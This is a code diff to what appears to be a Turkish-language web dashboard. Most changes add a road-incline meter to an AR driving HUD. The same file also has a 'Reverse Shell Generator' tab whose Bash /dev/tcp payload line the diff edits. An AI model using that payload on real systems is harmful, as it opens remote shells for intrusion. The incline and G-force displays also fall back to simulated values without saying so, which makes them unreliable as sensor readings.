@@ -110,7 +110,7 @@ HTML_TEMPLATE = """
         .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
         .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
         
-        /* Gelişmiş Cyberpunk AR HUD Stilleri & G-Force Ölçer */
+        /* Gelişmiş Cyberpunk AR HUD Stilleri & Incline HUD */
         .ar-container { position: relative; width: 100%; max-width: 720px; margin: 0 auto; background: #000; border-radius: 8px; overflow: hidden; border: 2px solid #38bdf8; box-shadow: 0 0 25px rgba(56,189,248,0.5); transition: 0.3s; }
         .ar-container:fullscreen { max-width: 100%; width: 100vw; height: 100vh; border: none; border-radius: 0; }
         #arVideo { width: 100%; height: 450px; object-fit: cover; display: block; filter: brightness(100%) contrast(100%); transition: filter 0.3s; }
@@ -122,6 +122,7 @@ HTML_TEMPLATE = """
         .ar-fuel-hud { position: absolute; top: 75px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #facc15; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #facc15; z-index: 10; font-weight: bold; }
         .ar-drag-hud { position: absolute; bottom: 15px; left: 15px; background: rgba(11, 15, 21, 0.9); border: 1px solid #ef4444; padding: 8px 14px; border-radius: 6px; font-size: 12px; color: #ef4444; z-index: 10; font-weight: bold; }
         .ar-gforce-hud { position: absolute; bottom: 70px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #38bdf8; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #38bdf8; z-index: 10; font-weight: bold; }
+        .ar-incline-hud { position: absolute; bottom: 125px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #a855f7; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #a855f7; z-index: 10; font-weight: bold; }
         
         .ar-speed-limit-hud { position: absolute; top: 125px; right: 15px; width: 48px; height: 48px; background: #ffffff; border: 4px solid #dc2626; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 15px; color: #000000; box-shadow: 0 0 12px rgba(220,38,38,0.6); z-index: 10; transition: 0.3s; }
         .ar-speed-limit-hud.speeding { background: #dc2626; color: #ffffff; animation: pulseLimit 0.6s infinite alternate; }
@@ -198,15 +199,16 @@ HTML_TEMPLATE = """
 
         <!-- AR Navigasyon & Taktiksel HUD Modülü -->
         <div id="arNavTab" class="tab-content">
-            <h3>🧭 AR Navigasyon, Yakıt, ETA, 0-100, Hız Limiti & G-Force</h3>
-            <p style="color: #94a3b8; font-size: 13px;">G-G kuvveti ölçer, dinamik hız limiti tabelası, yakıt ve sürüş kara kutusu entegre çalışır.</p>
+            <h3>🧭 AR Navigasyon, Yakıt, ETA, 0-100, Hız Limiti, G-Force & Eğim Ölçer</h3>
+            <p style="color: #94a3b8; font-size: 13px;">Yokuş eğim derecesi, G-Force, hız limiti, yakıt ve kara kutu telemetrisi tam entegre çalışır.</p>
             
             <div class="ar-controls">
                 <span style="color:#38bdf8; font-weight:bold;">HUD Modül Kontrolleri:</span>
                 <label><input type="checkbox" id="chkAutoDim" checked> 🌙 Auto-Dimming (Gece Karartma)</label>
                 <label><input type="checkbox" id="chkLane" checked> 🚧 Şerit Takip Asistanı</label>
                 <label><input type="checkbox" id="chkSpeedLimit" checked> 🚸 Dinamik Hız Limiti</label>
-                <label><input type="checkbox" id="chkGForce" checked> 🌀 G-G Kuvveti Ölçer (G-Meter)</label>
+                <label><input type="checkbox" id="chkGForce" checked> 🌀 G-Force Ölçer</label>
+                <label><input type="checkbox" id="chkIncline" checked> 📈 Yokuş & Eğim Ölçer</label>
                 <label><input type="checkbox" id="chkNightVision"> 🔦 Gece Görüşü / Termal Mod</label>
                 <label><input type="checkbox" id="chkCompass"> Jiroskop & Pusula</label>
                 <label><input type="checkbox" id="chkSpatial" checked> Sesli Asistan</label>
@@ -235,6 +237,7 @@ HTML_TEMPLATE = """
                 <div id="arFuelHud" class="ar-fuel-hud">⛽ Yakıt: %85 | Menzil: 240 km</div>
                 <div id="arDragHud" class="ar-drag-hud">⏱️ 0-100 Drag: Hazır (0.00s)</div>
                 <div id="arGForceHud" class="ar-gforce-hud">🌀 G-Force: Lat 0.00G | Long 0.00G</div>
+                <div id="arInclineHud" class="ar-incline-hud">📈 Eğim: %0 (0°)</div>
                 <div id="arSpeedLimitHud" class="ar-speed-limit-hud">50</div>
                 <div id="arWeatherWidget" class="ar-weather-hud">⛅ 22°C | Rüzgar: 12 km/s</div>
                 
@@ -242,14 +245,14 @@ HTML_TEMPLATE = """
                 <canvas id="arCanvas"></canvas>
             </div>
 
-            <h4 style="margin-top: 20px; color: #38bdf8;">📋 G-Force & Kara Kutu Log Akışı:</h4>
-            <div id="arLogTerminal" class="ar-log-box">[00:00:00] G-G kuvveti ölçer ve telemetri kayıt sistemi aktif.</div>
+            <h4 style="margin-top: 20px; color: #38bdf8;">📋 Eğim & Kara Kutu Log Akışı:</h4>
+            <div id="arLogTerminal" class="ar-log-box">[00:00:00] Yokuş eğim derecesi ölçer ve telemetri kayıt sistemi aktif.</div>
         </div>
 
         <!-- Sürüş Raporları & Kara Kutu Sekmesi -->
         <div id="drivingTab" class="tab-content">
             <h3>⛽ Sürüş Raporları & Kara Kutu (Blackbox) Arşivi</h3>
-            <p style="color: #94a3b8; font-size: 13px;">AR ekranında "Sürüşü Bitir & Rapor Al" butonuna bastığında oluşturulan sürüş telemetrilerini, G-force maksimum değerlerini ve raporu buradan indirebilirsin.</p>
+            <p style="color: #94a3b8; font-size: 13px;">AR ekranında "Sürüşü Bitir & Rapor Al" butonuna bastığında oluşturulan sürüş telemetrilerini, maksimum eğim değerlerini ve raporu buradan indirebilirsin.</p>
             <div id="drivingReportsContainer">
                 <p style='color:#94a3b8;'>Henüz kaydedilmiş sürüş raporu yok. AR Navigasyon sekmesinden sürüşü başlatıp bitirebilirsiniz.</p>
             </div>
@@ -351,7 +354,7 @@ HTML_TEMPLATE = """
         <div id="payloadTab" class="tab-content">
             <h3>Reverse Shell Generator</h3>
             <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="attackerIp" placeholder="LHOST"><input type="text" id="attackerPort" placeholder="LPORT"><button onclick="generatePayloads()">Generate</button></div>
-            <div class="payload-box"><b>Bash:</b><br><code id="bashPayload" style="color:#00ff66;">bash -i >& /dev/tcp/IP/PORT 0>&1</code></div>
+            <div class="payload-box"><b>Bash:</b><br><code id="bashPayload" style="color:#00ff66;">bash -i >& /dev/tcp/${ip}/${port} 0>&1</code></div>
         </div>
 
         <div id="dataTab" class="tab-content">
@@ -374,6 +377,7 @@ HTML_TEMPLATE = """
         let dragTesting = false, dragStartTime = 0, bestDragTime = null;
         let currentSpeedLimit = 50;
         let currentLatG = 0, currentLongG = 0, maxRecordedG = 0;
+        let currentInclineDeg = 0, maxRecordedIncline = 0;
 
         function switchTab(tabId) {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
@@ -392,7 +396,6 @@ HTML_TEMPLATE = """
             if (event.beta !== null) deviceBeta = Math.round(event.beta);
         }
 
-        // G-Force sensör verisi dinleme
         function handleMotion(event) {
             if (event.acceleration) {
                 let ax = event.acceleration.x || 0;
@@ -483,7 +486,7 @@ HTML_TEMPLATE = """
             logTerminal.scrollTop = logTerminal.scrollHeight;
         }
 
-        // --- AR MOTORU: AUTO-DIMMING, YAKIT, ETA, DRAG, HIZ LİMİTİ & G-FORCE ---
+        // --- AR MOTORU: AUTO-DIMMING, YAKIT, ETA, DRAG, HIZ LİMİTİ, G-FORCE & İNCLE ---
         async function startARCamera() {
             let video = document.getElementById('arVideo');
             let hud = document.getElementById('arHudText');
@@ -491,6 +494,7 @@ HTML_TEMPLATE = """
             let fuelHud = document.getElementById('arFuelHud');
             let dragHud = document.getElementById('arDragHud');
             let gforceHud = document.getElementById('arGForceHud');
+            let inclineHud = document.getElementById('arInclineHud');
             let speedLimitHud = document.getElementById('arSpeedLimitHud');
             let hudBox = document.getElementById('arHudBox');
             let canvas = document.getElementById('arCanvas');
@@ -501,9 +505,10 @@ HTML_TEMPLATE = """
             drivingRange = 240;
             currentDistance = 150;
             maxRecordedG = 0;
+            maxRecordedIncline = 0;
 
             let useCompass = document.getElementById('chkCompass').checked;
-            if (useCompass || document.getElementById('chkLane').checked) {
+            if (useCompass || document.getElementById('chkLane').checked || document.getElementById('chkIncline').checked) {
                 if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                     try { await DeviceOrientationEvent.requestPermission(); } catch(e){}
                 }
@@ -526,8 +531,8 @@ HTML_TEMPLATE = """
             }
 
             video.srcObject = arStream;
-            hud.innerText = "HUD Aktif: G-Force & Telemetri Devrede";
-            speakSpatial("AR Navigasyon ve G kuvveti ölçer başlatıldı.", true);
+            hud.innerText = "HUD Aktif: Eğim & Telemetri Devrede";
+            speakSpatial("AR Navigasyon ve yokuş eğim ölçer başlatıldı.", true);
 
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
@@ -559,10 +564,22 @@ HTML_TEMPLATE = """
                     hudBox.style.borderColor = "#00ff66";
                 }
 
+                // Incline / Eğim Ölçer HUD
+                let useIncline = document.getElementById('chkIncline').checked;
+                if (useIncline) {
+                    inclineHud.style.display = "block";
+                    // deviceBeta [-180, 180] pitch açısını temsil eder.
+                    currentInclineDeg = (deviceBeta !== 0 ? Math.round((deviceBeta / 90) * 12) : Math.round(Math.sin(step * 0.04) * 8));
+                    let inclinePercent = Math.round(Math.tan(currentInclineDeg * Math.PI / 180) * 100);
+                    if (Math.abs(currentInclineDeg) > maxRecordedIncline) maxRecordedIncline = Math.abs(currentInclineDeg);
+                    inclineHud.innerText = `📈 Eğim: %${inclinePercent} (${currentInclineDeg}°)`;
+                } else {
+                    inclineHud.style.display = "none";
+                }
+
                 // G-Force HUD Güncelleme
                 if (useGForce) {
                     gforceHud.style.display = "block";
-                    // Eğer gerçek sensör verisi yoksa dinamik simülasyon üret
                     if (currentLatG == 0 && currentLongG == 0) {
                         currentLatG = (Math.sin(step * 0.1) * 0.35).toFixed(2);
                         currentLongG = (dragTesting ? 0.45 : (Math.cos(step * 0.05) * 0.15)).toFixed(2);
@@ -572,7 +589,7 @@ HTML_TEMPLATE = """
                     gforceHud.style.display = "none";
                 }
 
-                // Dinamik Hız Limiti Güncelleme Simülasyonu
+                // Dinamik Hız Limiti Güncelleme
                 let useSpeedLimit = document.getElementById('chkSpeedLimit').checked;
                 if (useSpeedLimit) {
                     speedLimitHud.style.display = "flex";
@@ -697,7 +714,7 @@ HTML_TEMPLATE = """
 
                 // Canlı Kara Kutu Telemetri Kaydı
                 if (step % 40 === 0) {
-                    let logStr = `[${timestamp}] Hız: ${currentSpeed} km/s | G-Force [Lat:${currentLatG}G, Long:${currentLongG}G] | Yakıt: %${Math.round(fuelLevel)}`;
+                    let logStr = `[${timestamp}] Hız: ${currentSpeed}km/s | Eğim: ${currentInclineDeg}° | Yakıt: %${Math.round(fuelLevel)}`;
                     sessionLogs.push(logStr);
                     logTerminal.innerHTML += `<br>` + logStr;
                     logTerminal.scrollTop = logTerminal.scrollHeight;
@@ -719,6 +736,7 @@ HTML_TEMPLATE = """
             document.getElementById('arTelemetry').innerText = "HIZ: 0 km/s | ETA: --";
             document.getElementById('arDragHud').innerText = "⏱️ 0-100 Drag: Hazır (0.00s)";
             document.getElementById('arGForceHud').innerText = "🌀 G-Force: Lat 0.00G | Long 0.00G";
+            document.getElementById('arInclineHud').innerText = "📈 Eğim: %0 (0°)";
             dragTesting = false;
         }
 
@@ -729,13 +747,14 @@ HTML_TEMPLATE = """
             if(bestDragTime) {
                 sessionLogs.unshift(`[ÖZET] En İyi 0-100 Drag Süresi: ${bestDragTime} sn`);
             }
+            sessionLogs.unshift(`[ÖZET] Maksimum Tırmanma/İniş Eğimi: ${maxRecordedIncline}°`);
             let sessionData = {
                 time: new Date().toLocaleString(),
                 logs: sessionLogs
             };
             let res = await fetch('/api/driving/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sessionData) });
             let data = await res.json();
-            alert("Sürüş başarıyla tamamlandı! 'Sürüş Raporları' sekmesinden G-Force, hız ihlalleri ve drag sonuçlarını içeren kara kutu raporunu indirebilirsin.");
+            alert("Sürüş başarıyla tamamlandı! 'Sürüş Raporları' sekmesinden eğim derecesi ve kara kutu raporunu indirebilirsin.");
             switchTab('drivingTab');
         }
 
